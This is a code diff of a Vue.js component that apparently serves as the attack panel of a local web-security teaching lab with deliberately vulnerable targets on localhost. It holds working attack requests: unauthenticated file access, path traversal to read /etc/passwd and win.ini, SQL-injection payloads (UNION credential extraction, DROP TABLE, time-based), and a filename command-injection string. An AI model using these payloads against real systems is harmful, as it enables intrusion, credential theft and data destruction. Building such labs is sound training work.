@@ -55,7 +55,7 @@
       <div class="attack-module">
         <h4>2. 目录遍历攻击 (Path Traversal)</h4>
         <div class="module-description">
-          尝试通过特殊文件名访问系统文件
+          尝试通过特殊文件名访问系统文件（5002端口：路径验证已被绕过）
         </div>
         
         <div class="attack-inputs">
@@ -82,171 +82,142 @@
       <div class="attack-module">
         <h4>3. 模拟SQL注入攻击</h4>
         <div class="module-description">
-          演示类似SQL注入的文件名注入攻击
+          测试SQL注入漏洞的各种变种
         </div>
         
         <div class="attack-inputs">
           <select v-model="selectedInjectionType" class="select-attack">
+            <option value="blind">布尔盲注</option>
             <option value="union">UNION注入</option>
-            <option value="blind">盲注</option>
             <option value="error">报错注入</option>
             <option value="time">时间盲注</option>
+            <option value="filename">文件名注入</option>
           </select>
           
           <input 
             v-model="injectionPayload" 
-            placeholder="注入payload"
+            :placeholder="getPlaceholderText()"
             class="input-attack"
           />
           
-          <button @click="testInjection" class="btn-attack-danger">
+          <button @click="testSpecificSqlInjection" class="btn-attack btn-attack-danger">
             执行注入攻击
-          </button>
-          <button @click="testFilenameInjection" class="btn-attack-danger">
-            文件名注入攻击
-          </button>
-          <button @click="testCommandInjection" class="btn-attack-danger">
-            命令注入攻击
           </button>
         </div>
 
+        <!-- 预设注入语句按钮 -->
         <div class="payload-examples">
-          <h5>Payload示例:</h5>
+          <h5>常用注入语句:</h5>
           <div class="payload-list">
-            <div v-for="payload in injectionExamples" :key="payload.id">
+            <div v-for="payload in injectionPayloads" :key="payload.id">
               <code>{{ payload.payload }}</code>
               <span>{{ payload.description }}</span>
-              <button @click="usePayload(payload)" class="btn-small">
-                使用
-              </button>
+              <button @click="usePayload(payload)" class="btn-small">使用</button>
             </div>
           </div>
         </div>
 
         <div class="test-results">
-          <h5>注入结果:</h5>
+          <h5>攻击结果:</h5>
           <div class="result-content">{{ injectionResults }}</div>
         </div>
       </div>
 
-      <!-- 4. ECB模式漏洞演示 -->
+      <!-- 4. ECB加密模式漏洞 -->
       <div class="attack-module">
         <h4>4. ECB加密模式漏洞</h4>
         <div class="module-description">
-          展示相同明文产生相同密文的安全问题
+          利用ECB模式的弱点，相同明文产生相同密文的特性
         </div>
         
         <div class="attack-actions">
-          <button @click="uploadIdenticalFiles" class="btn-attack">
-            上传两个相同文件
+          <button @click="testEcbPattern" class="btn-attack">
+            上传相同文件测试模式
           </button>
           <button @click="compareEncryptedFiles" class="btn-attack">
-            比较加密结果
+            比较加密文件
           </button>
-        </div>
-
-        <div class="file-comparison" v-if="comparisonResult">
-          <h5>比较结果:</h5>
-          <div class="comparison-chart">
-            <div class="file-item" v-for="file in comparisonResult.files" :key="file.name">
-              <div class="file-name">{{ file.name }}</div>
-              <div class="file-hash">{{ file.hash.substring(0, 16) }}...</div>
-              <div class="file-similarity" :style="{width: file.similarity + '%'}">
-                相似度: {{ file.similarity }}%
-              </div>
-            </div>
-          </div>
         </div>
 
         <div class="test-results">
-          <h5>漏洞说明:</h5>
+          <h5>测试结果:</h5>
           <div class="result-content">{{ ecbResults }}</div>
-        </div>
-      </div>
-
-      <!-- 5. JWT令牌攻击 -->
-      <div class="attack-module">
-        <h4>5. JWT令牌攻击</h4>
-        <div class="module-description">
-          测试JWT令牌的安全性问题
-        </div>
-        
-        <div class="attack-inputs">
-          <textarea 
-            v-model="jwtToken" 
-            placeholder="输入JWT令牌"
-            class="textarea-attack"
-          />
-          <button @click="analyzeJWT" class="btn-attack">
-            分析令牌
-          </button>
-          <button @click="testJWTWeakness" class="btn-attack-danger">
-            测试弱密钥
-          </button>
-          <button @click="testJWTNoneAlg" class="btn-attack-danger">
-            测试none算法
-          </button>
-          <button @click="testJWTKidInjection" class="btn-attack-danger">
-            测试KID注入
-          </button>
-        </div>
-
-        <div class="jwt-analysis" v-if="jwtAnalysis">
-          <h5>令牌分析:</h5>
-          <div class="jwt-details">
-            <div><strong>Header:</strong> {{ jwtAnalysis.header }}</div>
-            <div><strong>Payload:</strong> {{ jwtAnalysis.payload }}</div>
-            <div><strong>是否过期:</strong> {{ jwtAnalysis.expired ? '是' : '否' }}</div>
-            <div><strong>签名算法:</strong> {{ jwtAnalysis.algorithm }}</div>
+          <div v-if="comparisonResult" class="comparison-result">
+            <h6>文件比较结果:</h6>
+            <pre>{{ comparisonResult }}</pre>
           </div>
         </div>
       </div>
-    </div>
 
-    <!-- Burp Suite模拟面板 -->
-    <div class="burp-simulator">
-      <h3>Burp Suite模拟拦截器</h3>
-      <div class="burp-controls">
-        <button @click="toggleIntercept" class="btn-burp">
-          {{ intercepting ? '停止拦截' : '开始拦截' }}
-        </button>
-        <button @click="forwardRequest" class="btn-burp" :disabled="!currentInterceptedRequest">
-          转发请求
-        </button>
-        <button @click="dropRequest" class="btn-burp-danger" :disabled="!currentInterceptedRequest">
-          丢弃请求
-        </button>
-        <button @click="setupProxyInterception" class="btn-burp">
-          设置代理拦截
-        </button>
-        <button @click="testRequestReplay" class="btn-burp-danger">
-          测试重放攻击
-        </button>
+      <!-- 5. JWT分析 -->
+      <div class="attack-module">
+        <h4>5. JWT令牌分析</h4>
+        <div class="module-description">
+          分析JWT令牌结构和潜在漏洞
+        </div>
+        
+        <div class="attack-actions">
+          <button @click="getToken" class="btn-attack">
+            获取当前Token
+          </button>
+          <button @click="analyzeJwt" class="btn-attack">
+            分析Token结构
+          </button>
+        </div>
+
+        <div class="test-results">
+          <h5>Token信息:</h5>
+          <div class="result-content">{{ jwtToken }}</div>
+          <div v-if="jwtAnalysis" class="jwt-analysis">
+            <h6>Token分析:</h6>
+            <pre>{{ jwtAnalysis }}</pre>
+          </div>
+        </div>
       </div>
 
-      <div class="burp-request" v-if="currentInterceptedRequest">
-        <h5>拦截的请求:</h5>
-        <div class="request-details">
-          <div><strong>方法:</strong> {{ currentInterceptedRequest.method }}</div>
-          <div><strong>URL:</strong> {{ currentInterceptedRequest.url }}</div>
-          <div><strong>Body:</strong> {{ currentInterceptedRequest.body }}</div>
+      <!-- 6. Burp Suite模拟 -->
+      <div class="attack-module">
+        <h4>6. 请求拦截模拟</h4>
+        <div class="module-description">
+          模拟Burp Suite等代理工具拦截和修改HTTP请求
+        </div>
+        
+        <div class="attack-actions">
+          <button @click="toggleIntercept" :class="intercepting ? 'btn-danger' : 'btn-warning'">
+            {{ intercepting ? '停止拦截' : '开始拦截' }}
+          </button>
+          <button @click="sendInterceptedRequest" :disabled="!currentInterceptedRequest" class="btn-attack">
+            发送拦截的请求
+          </button>
+        </div>
+
+        <div class="intercept-info" v-if="currentInterceptedRequest">
+          <h5>拦截到的请求:</h5>
+          <pre>{{ JSON.stringify(currentInterceptedRequest, null, 2) }}</pre>
+        </div>
+
+        <div class="intercept-history" v-if="interceptedRequests.length">
+          <h5>拦截历史:</h5>
+          <div v-for="(req, index) in interceptedRequests.slice(-3)" :key="index" class="request-item">
+            {{ req.method }} {{ req.url }}
+          </div>
         </div>
       </div>
     </div>
 
     <!-- 攻击日志 -->
-    <div class="attack-log">
+    <div class="attack-logs">
       <h3>攻击日志</h3>
-      <div class="log-entries">
+      <div class="log-container">
         <div 
-          v-for="log in attackLogs" 
-          :key="log.id"
+          v-for="log in attackLogs.slice().reverse()" 
+          :key="log.id" 
           :class="['log-entry', log.type]"
         >
-          <span class="log-time">{{ log.time }}</span>
-          <span class="log-message">{{ log.message }}</span>
+          [{{ log.timestamp }}] {{ log.message }}
         </div>
       </div>
+      <button @click="clearLogs" class="btn-clear">清空日志</button>
     </div>
   </div>
 </template>
@@ -255,17 +226,22 @@
 export default {
   name: 'AttackTest',
   data() {
-    return {
-      // 攻击目标配置
-      targets: [
+    const initialTargetId = 'secure';
+    const targets = [
         { id: 'secure', name: '安全版本', port: 5000, url: 'http://localhost:5000' },
         { id: 'unauth', name: '未授权漏洞', port: 5001, url: 'http://localhost:5001' },
         { id: 'traversal', name: '目录遍历漏洞', port: 5002, url: 'http://localhost:5002' },
         { id: 'ecb', name: 'ECB漏洞', port: 5003, url: 'http://localhost:5003' },
         { id: 'full_vuln', name: '完全漏洞版本', port: 5004, url: 'http://localhost:5004' },
         { id: 'sql_injection', name: 'SQL注入漏洞', port: 5005, url: 'http://localhost:5005' }
-      ],
-      selectedTarget: 'secure',
+      ];
+    const initialTarget = targets.find(t => t.id === initialTargetId) || targets[0];
+
+    return {
+      // 攻击目标配置
+      targets,
+      selectedTarget: initialTargetId,
+      currentTarget: initialTarget,
       
       // 攻击状态
       statusText: '待命',
@@ -280,18 +256,18 @@ export default {
       
       // SQL注入相关
       selectedInjectionType: 'union',
-      injectionPayload: "' OR '1'='1",
+      injectionPayload: '',
       injectionResults: '',
-      injectionExamples: [
+      injectionPayloads: [
         { 
           id: 1, 
           payload: "' OR '1'='1", 
-          description: '基础布尔注入'
+          description: '万能密码'
         },
         { 
           id: 2, 
           payload: "'; DROP TABLE users; --", 
-          description: 'SQL删除语句'
+          description: '删表攻击'
         },
         { 
           id: 3, 
@@ -329,9 +305,39 @@ export default {
       logCounter: 0
     };
   },
-  computed: {
-    currentTarget() {
-      return this.targets.find(t => t.id === this.selectedTarget);
+  created() {
+    // 组件创建时，手动触发一次目标选择的初始化逻辑
+    this.$nextTick(() => {
+      // 确保DOM更新后，记录初始日志
+      this.addLog(`初始目标: ${this.currentTarget.name} (${this.currentTarget.url})`);
+    });
+  },
+  watch: {
+    selectedTarget: {
+      handler(newTarget) {
+        // 当切换目标时，清除之前的测试结果
+        this.unauthResults = '';
+        this.traversalResults = '';
+        this.injectionResults = '';
+        this.ecbResults = '';
+        this.results = '';
+        this.comparisonResult = null;
+        this.jwtToken = '';
+        this.jwtAnalysis = null;
+        
+        // 更新当前目标
+        this.currentTarget = this.targets.find(t => t.id === newTarget) || this.targets[0];
+        
+        // 清除相关的localStorage项
+        localStorage.removeItem(`token_${newTarget}`);
+        if (newTarget === 'unauth' || newTarget === 'full_vuln') {
+          // 对于不需要token的目标，清除所有token
+          localStorage.removeItem('token');
+        }
+        
+        this.addLog(`切换到目标: ${this.currentTarget.name} (${this.currentTarget.url})`);
+      }
+      // 移除 immediate: true 以避免重复初始化
     }
   },
   methods: {
@@ -340,46 +346,147 @@ export default {
       this.selectedTarget = targetId;
       this.addLog(`切换到目标: ${this.currentTarget.name}`);
     },
+
+    // 根据选择的注入类型返回适当的占位符文本
+    getPlaceholderText() {
+      const placeholders = {
+        'blind': "例如: ' OR '1'='1'",
+        'union': "例如: ' UNION SELECT username, password FROM users --",
+        'error': "例如: ' AND 1=CONVERT(int, (SELECT @@version))--",
+        'time': "例如: ' OR IF(1=1, SLEEP(5), 0)--",
+        'filename': "例如: test.txt; echo 'hacked' > /tmp/hack.txt; #"
+      };
+      return placeholders[this.selectedInjectionType] || "输入注入payload";
+    },
     
     // 1. 未授权访问测试
     async testUnauthListFiles() {
       this.addLog('开始测试未授权访问文件列表');
       
       try {
-        const response = await fetch(`${this.currentTarget.url}/api/files`);
-        const data = await response.json();
+        this.addLog(`发送请求到: ${this.currentTarget.url}/api/files`);
+        this.addLog(`目标端口: ${this.currentTarget.port}`);
+        
+        const response = await fetch(`${this.currentTarget.url}/api/files`, {
+          headers: {
+            'x-target-port': this.currentTarget.port
+          }
+        });
+        
+        this.addLog(`收到响应，状态码: ${response.status}`);
+        
+        let data;
+        try {
+          data = await response.json();
+        } catch (parseError) {
+          // 如果无法解析JSON，尝试获取文本内容
+          const text = await response.text();
+          this.addLog(`响应内容(非JSON): ${text.substring(0, 200)}`);
+          data = { message: text || 'Empty response' };
+        }
         
         if (response.ok) {
           this.unauthResults = `漏洞存在！无需登录获取到 ${data.files?.length || 0} 个文件`;
           this.updateStatus('danger', '发现未授权访问漏洞');
           this.addLog(`成功获取文件列表，状态码: ${response.status}`);
         } else {
-          this.unauthResults = `安全：需要认证 (${response.status})`;
-          this.addLog(`访问被拒绝，状态码: ${response.status}`);
+          this.unauthResults = `安全：需要认证 (${response.status})\n详细信息: ${JSON.stringify(data)}`;
+          this.addLog(`访问被拒绝，状态码: ${response.status}，信息: ${JSON.stringify(data)}`);
         }
       } catch (error) {
         this.unauthResults = `请求失败: ${error.message}`;
         this.addLog(`请求失败: ${error.message}`, 'error');
+        console.error('未授权访问测试失败:', error);
       }
     },
     
     async testUnauthDownload() {
-      this.addLog('尝试未授权下载文件');
+      this.addLog('开始下载文件');
       
-      const testFile = 'test.txt';
       try {
-        const response = await fetch(`${this.currentTarget.url}/api/download/${testFile}`);
+        // 首先获取文件列表
+        const token = await this.getToken();
+        const headers = {
+          'x-target-port': this.currentTarget.port
+        };
+        
+        // 只有在有token且不是免认证目标时才添加Authorization头
+        if (token && this.selectedTarget !== 'unauth' && this.selectedTarget !== 'full_vuln') {
+          headers['Authorization'] = `Bearer ${token}`;
+        }
+        
+        const listResponse = await fetch(`${this.currentTarget.url}/api/files`, {
+          headers: headers
+        });
+        
+        let listData;
+        try {
+          listData = await listResponse.json();
+        } catch (parseError) {
+          const text = await listResponse.text();
+          this.addLog(`文件列表响应内容(非JSON): ${text.substring(0, 200)}`);
+          listData = { message: text || 'Empty response' };
+        }
+        
+        if (!listResponse.ok) {
+          this.unauthResults = `获取文件列表失败: ${listData.message || listResponse.status}`;
+          this.addLog(`获取文件列表失败: ${listData.message || listResponse.status}`);
+          return;
+        }
+        
+        // 检查是否有文件可以下载
+        if (!listData.files || listData.files.length === 0) {
+          this.unauthResults = '没有可下载的文件，请先上传文件';
+          this.addLog('没有可下载的文件，请先上传文件');
+          return;
+        }
+        
+        // 下载第一个文件
+        const fileName = listData.files[0].name;
+        this.addLog(`尝试下载文件: ${fileName}`);
+        
+        const response = await fetch(`${this.currentTarget.url}/api/download/${fileName}`, {
+          headers: headers
+        });
         
         if (response.ok) {
-          this.unauthResults = `漏洞存在！成功下载文件: ${testFile}`;
-          this.updateStatus('danger', '文件未授权下载成功');
-          this.addLog(`成功下载文件: ${testFile}`);
+          // 检查响应是否为文件流
+          const contentType = response.headers.get('content-type');
+          if (contentType && contentType.includes('application/json')) {
+            // 如果返回的是JSON，说明可能是错误信息
+            const data = await response.json();
+            this.unauthResults = `下载失败: ${data.message || '服务器返回错误'}`;
+            this.addLog(`下载失败: ${data.message}`);
+          } else {
+            // 如果是文件流，则创建下载链接
+            const blob = await response.blob();
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = fileName;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            window.URL.revokeObjectURL(url);
+            
+            this.unauthResults = `文件下载成功: ${fileName}`;
+            this.addLog(`文件下载成功: ${fileName}`);
+          }
         } else {
-          this.unauthResults = `下载失败 (${response.status})`;
-          this.addLog(`下载被拒绝: ${response.status}`);
+          // 尝试解析错误响应
+          try {
+            const data = await response.json();
+            this.unauthResults = `下载失败 (${response.status}): ${data.message}`;
+            this.addLog(`下载失败: ${data.message}`);
+          } catch (e) {
+            const text = await response.text();
+            this.unauthResults = `下载失败 (${response.status}): ${text}`;
+            this.addLog(`下载失败: ${response.status} - ${text}`);
+          }
         }
       } catch (error) {
         this.unauthResults = `下载失败: ${error.message}`;
+        this.addLog(`下载失败: ${error.message}`, 'error');
       }
     },
     
@@ -391,12 +498,26 @@ export default {
       formData.append('file', blob, 'hack.txt');
       
       try {
+        // 对于未授权访问测试，明确不发送token
+        // 为未授权访问测试添加目标端口头部，但不添加认证信息
+        const headers = {
+          'x-target-port': this.currentTarget.port
+        };
+        
         const response = await fetch(`${this.currentTarget.url}/api/upload`, {
           method: 'POST',
+          headers: headers,
           body: formData
         });
         
-        const data = await response.json();
+        let data;
+        try {
+          data = await response.json();
+        } catch (parseError) {
+          const text = await response.text();
+          this.addLog(`上传响应内容(非JSON): ${text.substring(0, 200)}`);
+          data = { message: text || 'Empty response' };
+        }
         
         if (response.ok) {
           this.unauthResults = `漏洞存在！成功上传文件: ${data.message}`;
@@ -404,10 +525,11 @@ export default {
           this.addLog(`文件上传成功: ${data.message}`);
         } else {
           this.unauthResults = `上传失败: ${data.message || response.status}`;
-          this.addLog(`上传被拒绝: ${data.message}`);
+          this.addLog(`上传被拒绝: ${data.message || response.status}`);
         }
       } catch (error) {
         this.unauthResults = `上传失败: ${error.message}`;
+        this.addLog(`上传失败: ${error.message}`, 'error');
       }
     },
     
@@ -415,13 +537,17 @@ export default {
     async testTraversalUpload() {
       this.addLog(`尝试上传恶意文件: ${this.traversalFilename}`);
       
-      const token = await this.getToken();
+      // 目录遍历漏洞测试针对5002端口，现在不需要token
       const formData = new FormData();
       const blob = new Blob(['恶意文件内容'], { type: 'text/plain' });
       formData.append('file', blob, this.traversalFilename);
       
       try {
-        const headers = token ? { 'Authorization': `Bearer ${token}` } : {};
+        // 目录遍历攻击不需要认证
+        const headers = {
+          'x-target-port': this.currentTarget.port
+        };
+        
         const response = await fetch(`${this.currentTarget.url}/api/upload`, {
           method: 'POST',
           headers: headers,
@@ -431,8 +557,8 @@ export default {
         const data = await response.json();
         
         if (response.ok) {
-          this.traversalResults = `⚠️ 漏洞可能: 成功上传恶意文件名\n响应: ${JSON.stringify(data)}`;
-          this.updateStatus('warning', '检测到目录遍历可能');
+          this.traversalResults = `⚠️ 漏洞存在: 成功上传恶意文件名\n响应: ${JSON.stringify(data)}`;
+          this.updateStatus('warning', '检测到目录遍历漏洞');
           this.addLog(`上传了恶意文件名: ${this.traversalFilename}`);
         } else if (response.status === 400) {
           this.traversalResults = `✅ 安全：系统拒绝了恶意文件名\n原因: ${data.message}`;
@@ -442,64 +568,277 @@ export default {
         }
       } catch (error) {
         this.traversalResults = `请求失败: ${error.message}`;
+        this.addLog(`请求失败: ${error.message}`, 'error');
       }
     },
     
     async testTraversalDownload() {
       this.addLog('尝试通过目录遍历下载系统文件');
       
-      const maliciousPath = '../../../etc/passwd';
-      const token = await this.getToken();
+      // Windows系统尝试读取系统文件
+      const maliciousPaths = ['../../../../windows/win.ini', '../../../etc/passwd'];
       
-      try {
-        const headers = token ? { 'Authorization': `Bearer ${token}` } : {};
-        const response = await fetch(
-          `${this.currentTarget.url}/api/download/${encodeURIComponent(maliciousPath)}`,
-          { headers }
-        );
-        
-        if (response.ok) {
-          const blob = await response.blob();
-          this.traversalResults = `🚨 严重漏洞！成功下载系统文件\n文件大小: ${blob.size} 字节`;
-          this.updateStatus('danger', '目录遍历攻击成功');
-          this.addLog('成功下载疑似系统文件', 'danger');
-        } else {
-          this.traversalResults = `下载失败: ${response.status}`;
-          this.addLog(`目录遍历被阻止: ${response.status}`);
+      for (const maliciousPath of maliciousPaths) {
+        try {
+          // 目录遍历攻击不需要认证
+          const headers = {
+            'x-target-port': this.currentTarget.port
+          };
+          
+          this.addLog(`正在尝试访问路径: ${maliciousPath}`);
+          
+          const response = await fetch(
+            `${this.currentTarget.url}/api/download/${encodeURIComponent(maliciousPath)}`,
+            { 
+              headers: headers
+            }
+          );
+          
+          this.addLog(`收到响应，状态码: ${response.status}`);
+          
+          // 检查响应类型
+          const contentType = response.headers.get('content-type');
+          this.addLog(`响应Content-Type: ${contentType}`);
+          
+          if (response.ok) {
+            // 检查是否是文件流响应
+            if (contentType && !contentType.includes('application/json')) {
+              const blob = await response.blob();
+              this.traversalResults = `🚨 严重漏洞！成功下载系统文件\n文件大小: ${blob.size} 字节\n文件路径: ${maliciousPath}`;
+              this.updateStatus('danger', '目录遍历攻击成功');
+              this.addLog(`成功下载系统文件: ${maliciousPath}`, 'danger');
+              
+              // 触发文件下载
+              const url = window.URL.createObjectURL(blob);
+              const a = document.createElement('a');
+              a.href = url;
+              a.download = maliciousPath.split('/').pop() || 'downloaded_file';
+              document.body.appendChild(a);
+              a.click();
+              document.body.removeChild(a);
+              window.URL.revokeObjectURL(url);
+              
+              return;
+            } else {
+              // 可能是JSON错误响应
+              try {
+                const jsonData = await response.json();
+                this.addLog(`JSON响应内容: ${JSON.stringify(jsonData)}`);
+                this.traversalResults = `收到JSON响应而非文件: ${JSON.stringify(jsonData)}`;
+              } catch (e) {
+                const textData = await response.text();
+                this.addLog(`文本响应内容: ${textData}`);
+                this.traversalResults = `收到文本响应而非文件: ${textData}`;
+              }
+            }
+          } else {
+            try {
+              const errorData = await response.json();
+              this.addLog(`尝试路径 ${maliciousPath} 失败: ${response.status} - ${JSON.stringify(errorData)}`);
+              this.traversalResults = `下载失败 (${response.status}): ${JSON.stringify(errorData)}`;
+            } catch (e) {
+              const errorText = await response.text();
+              this.addLog(`尝试路径 ${maliciousPath} 失败: ${response.status} - ${errorText}`);
+              this.traversalResults = `下载失败 (${response.status}): ${errorText}`;
+            }
+          }
+        } catch (error) {
+          this.addLog(`尝试路径 ${maliciousPath} 请求失败: ${error.message}`, 'error');
+          this.traversalResults = `请求失败: ${error.message}`;
         }
-      } catch (error) {
-        this.traversalResults = `请求失败: ${error.message}`;
       }
+      
+      this.traversalResults = `所有路径尝试完毕，未能成功下载系统文件`;
+      this.addLog(`目录遍历攻击未成功`);
     },
     
     // 3. SQL注入模拟攻击
-    async testInjection() {
-      this.addLog(`执行${this.selectedInjectionType}注入: ${this.injectionPayload}`);
+    // 测试SQL注入（批量执行所有payload - 已禁用）
+    // async testInjection() {
+    //   this.addLog('开始SQL注入测试');
+    //   
+    //   try {
+    //     // 测试搜索接口的SQL注入
+    //     const searchPayloads = [
+    //       "' OR '1'='1",
+    //       "admin'--",
+    //       "' OR 1=1--"
+    //     ];
+    //     
+    //     let searchResults = '';
+    //     for (const payload of searchPayloads) {
+    //       this.addLog(`测试搜索注入: ${payload}`);
+    //       
+    //       try {
+    //         const response = await fetch(`${this.currentTarget.url}/api/vulnerable/search?q=${encodeURIComponent(payload)}`, {
+    //           headers: { 'x-target-port': this.currentTarget.port }
+    //         });
+    //         
+    //         const data = await response.json();
+    //         searchResults += `Payload: ${payload}\n`;
+    //         searchResults += `状态: ${response.status}\n`;
+    //         searchResults += `结果: ${JSON.stringify(data, null, 2)}\n\n`;
+    //         
+    //         if (data.debug_info) {
+    //           this.addLog(`发现SQL注入漏洞: ${data.debug_info.query}`, 'danger');
+    //         }
+    //       } catch (error) {
+    //         searchResults += `Payload: ${payload}\n`;
+    //         searchResults += `错误: ${error.message}\n\n`;
+    //         this.addLog(`搜索注入测试错误: ${error.message}`, 'error');
+    //       }
+    //     }
+    //     
+    //     // 测试登录接口的SQL注入
+    //     const loginPayloads = [
+    //       { username: "' OR '1'='1", password: "anything" },
+    //       { username: "admin'--", password: "anything" },
+    //       { username: "' UNION SELECT 1,'admin','pass',1--", password: "pass" }
+    //     ];
+    //     
+    //     let loginResults = '';
+    //     for (const payload of loginPayloads) {
+    //       this.addLog(`测试登录注入: ${payload.username}`);
+    //       
+    //       try {
+    //         const response = await fetch(`${this.currentTarget.url}/api/vulnerable/login`, {
+    //           method: 'POST',
+    //           headers: {
+    //             'Content-Type': 'application/json',
+    //             'x-target-port': this.currentTarget.port
+    //           },
+    //           body: JSON.stringify(payload)
+    //         });
+    //         
+    //         const data = await response.json();
+    //         loginResults += `用户名: ${payload.username}\n`;
+    //         loginResults += `密码: ${payload.password}\n`;
+    //         loginResults += `状态: ${response.status}\n`;
+    //         loginResults += `结果: ${JSON.stringify(data, null, 2)}\n\n`;
+    //         
+    //         if (data.debug && data.debug.query) {
+    //           this.addLog(`发现登录SQL注入漏洞: ${data.debug.query}`, 'danger');
+    //         }
+    //         
+    //         if (data.success && data.token) {
+    //           this.addLog(`SQL注入登录成功，获得token: ${data.token.substring(0, 20)}...`, 'danger');
+    //         }
+    //       } catch (error) {
+    //         loginResults += `用户名: ${payload.username}\n`;
+    //         loginResults += `错误: ${error.message}\n\n`;
+    //         this.addLog(`登录注入测试错误: ${error.message}`, 'error');
+    //       }
+    //     }
+    //     
+    //     this.injectionResults = `=== 搜索注入测试 ===\n${searchResults}\n=== 登录注入测试 ===\n${loginResults}`;
+    //     
+    //   } catch (error) {
+    //     this.injectionResults = `测试失败: ${error.message}`;
+    //     this.addLog(`SQL注入测试失败: ${error.message}`, 'error');
+    //   }
+    // },
+    
+    // 测试特定的SQL注入（修正版本）
+    async testSpecificSqlInjection() {
+      this.addLog('开始测试特定SQL注入');
       
-      // 模拟文件搜索功能中的SQL注入
-      const formData = new FormData();
-      const filename = `test${this.injectionPayload}.txt`;
-      const blob = new Blob(['注入测试'], { type: 'text/plain' });
-      formData.append('file', blob, filename);
-      
-      const token = await this.getToken();
+      // 清除之前的测试结果
+      this.injectionResults = '';
       
       try {
-        const headers = token ? { 'Authorization': `Bearer ${token}` } : {};
-        const response = await fetch(`${this.currentTarget.url}/api/upload`, {
-          method: 'POST',
-          headers: headers,
-          body: formData
-        });
+        // 根据当前选择的注入类型决定使用哪个payload
+        let payload, endpoint, method, body;
         
-        const data = await response.json();
+        switch(this.selectedInjectionType) {
+          case 'union':
+            payload = "' UNION SELECT username, password FROM users --";
+            endpoint = '/api/vulnerable/search';
+            method = 'GET';
+            break;
+          case 'blind':
+            payload = "' OR '1'='1";
+            endpoint = '/api/vulnerable/search';
+            method = 'GET';
+            break;
+          case 'error':
+            payload = "' AND 1=CONVERT(int, (SELECT @@version))--";
+            endpoint = '/api/vulnerable/search';
+            method = 'GET';
+            break;
+          case 'time':
+            payload = "' OR IF(1=1, SLEEP(5), 0)--";
+            endpoint = '/api/vulnerable/search';
+            method = 'GET';
+            break;
+          case 'filename':
+            // 文件名注入
+            payload = "test.txt; echo 'hacked' > /tmp/hack.txt; #";
+            endpoint = '/api/upload';
+            method = 'POST';
+            break;
+          default:
+            payload = this.injectionPayload || "' OR '1'='1";
+            endpoint = '/api/vulnerable/search';
+            method = 'GET';
+        }
         
-        // 分析响应中的注入痕迹
-        this.analyzeInjectionResponse(response, data, filename);
+        // 执行单个注入测试
+        if (method === 'GET') {
+          const response = await fetch(`${this.currentTarget.url}${endpoint}?q=${encodeURIComponent(payload)}`, {
+            headers: { 'x-target-port': this.currentTarget.port }
+          });
+          
+          const data = await response.json();
+          this.injectionResults = `Payload: ${payload}\n状态: ${response.status}\n结果: ${JSON.stringify(data, null, 2)}`;
+          
+          // 分析响应中的漏洞迹象
+          if (data.vulnerable === true) {
+            this.addLog(`发现SQL注入漏洞: ${payload}`, 'danger');
+            this.updateStatus('danger', 'SQL注入漏洞发现');
+          } else if (data.error && data.error.includes('result columns')) {
+            // 列数不匹配是UNION注入的典型特征
+            this.addLog(`UNION注入列数不匹配: ${data.error}`, 'warning');
+            this.addLog(`提示: 需要调整SELECT语句的列数以匹配原始查询`, 'info');
+          } else if (data.users && data.users.length > 3) {
+            // 返回了多个用户数据，可能是布尔盲注成功
+            this.addLog(`可能的数据泄露: 查询返回了${data.users.length}个用户`, 'danger');
+            this.updateStatus('danger', '数据泄露风险');
+          } else {
+            this.addLog(`测试完成: ${payload}`);
+          }
+        } else if (method === 'POST') {
+          // 处理文件上传的情况
+          const formData = new FormData();
+          const blob = new Blob(['注入测试内容'], { type: 'text/plain' });
+          formData.append('file', blob, payload);
+          
+          const token = await this.getToken();
+          const headers = {};
+          if (token) {
+            headers['Authorization'] = `Bearer ${token}`;
+          }
+          headers['x-target-port'] = this.currentTarget.port;
+          
+          const response = await fetch(`${this.currentTarget.url}${endpoint}`, {
+            method: 'POST',
+            headers: headers,
+            body: formData
+          });
+          
+          const data = await response.json();
+          this.injectionResults = `Payload: ${payload}\n状态: ${response.status}\n结果: ${JSON.stringify(data, null, 2)}`;
+          
+          if (response.status === 500 && JSON.stringify(data).toLowerCase().includes('error')) {
+            this.addLog(`发现可能的注入漏洞: ${payload}`, 'danger');
+            this.updateStatus('danger', '文件名注入可能');
+          } else {
+            this.addLog(`测试完成: ${payload}`);
+          }
+        }
         
       } catch (error) {
-        this.injectionResults = `注入失败: ${error.message}`;
-        this.addLog(`注入攻击失败: ${error.message}`, 'error');
+        this.injectionResults = `测试失败: ${error.message}`;
+        this.addLog(`SQL注入测试失败: ${error.message}`, 'error');
       }
     },
     
@@ -676,10 +1015,18 @@ export default {
     async uploadIdenticalFiles() {
       this.addLog('开始上传两个相同的文件测试ECB模式');
       
+      // 确保只在ECB漏洞目标上运行
+      if (this.selectedTarget !== 'ecb') {
+        this.ecbResults = '请先选择"ECB漏洞"目标';
+        this.addLog('错误：ECB模式攻击只能在ECB漏洞目标上运行', 'error');
+        return;
+      }
+      
       const fileContent = 'A'.repeat(100); // 创建重复模式的内容
       const file1 = new Blob([fileContent], { type: 'text/plain' });
       const file2 = new Blob([fileContent], { type: 'text/plain' });
       
+      // ECB漏洞测试针对5003端口，需要token
       const token = await this.getToken();
       
       try {
@@ -687,11 +1034,17 @@ export default {
         const formData1 = new FormData();
         formData1.append('file', file1, 'ecb_test1.txt');
         
-        const headers = token ? { 'Authorization': `Bearer ${token}` } : {};
+        const headers1 = {
+          'x-target-port': this.currentTarget.port
+        };
+        // 只有在有token且不是免认证目标时才添加Authorization头
+        if (token && this.selectedTarget !== 'unauth' && this.selectedTarget !== 'full_vuln') {
+          headers1['Authorization'] = `Bearer ${token}`;
+        }
         
         const response1 = await fetch(`${this.currentTarget.url}/api/upload`, {
           method: 'POST',
-          headers: headers,
+          headers: headers1,
           body: formData1
         });
         
@@ -699,20 +1052,33 @@ export default {
         const formData2 = new FormData();
         formData2.append('file', file2, 'ecb_test2.txt');
         
+        const headers2 = {
+          'x-target-port': this.currentTarget.port
+        };
+        // 只有在有token且不是免认证目标时才添加Authorization头
+        if (token && this.selectedTarget !== 'unauth' && this.selectedTarget !== 'full_vuln') {
+          headers2['Authorization'] = `Bearer ${token}`;
+        }
+        
         const response2 = await fetch(`${this.currentTarget.url}/api/upload`, {
           method: 'POST',
-          headers: headers,
+          headers: headers2,
           body: formData2
         });
+        
+        const data1 = await response1.json();
+        const data2 = await response2.json();
         
         if (response1.ok && response2.ok) {
